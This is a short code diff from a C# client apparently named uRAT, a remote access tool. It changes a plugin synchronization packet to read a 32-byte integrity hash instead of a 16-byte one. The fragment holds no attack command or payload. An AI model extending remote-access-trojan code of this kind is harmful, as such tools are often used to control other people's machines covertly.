@@ -64,7 +64,7 @@ namespace uRAT.Client.Plugin.Synchronization.Packets
                 {
                     Action = (PluginAction) br.ReadByte(),
                     PluginGuid = new Guid(br.ReadBytes(16)),
-                    IntegrityHash = br.ReadBytes(16)
+                    IntegrityHash = br.ReadBytes(32)
                 };
 
                 var size = br.ReadInt32();
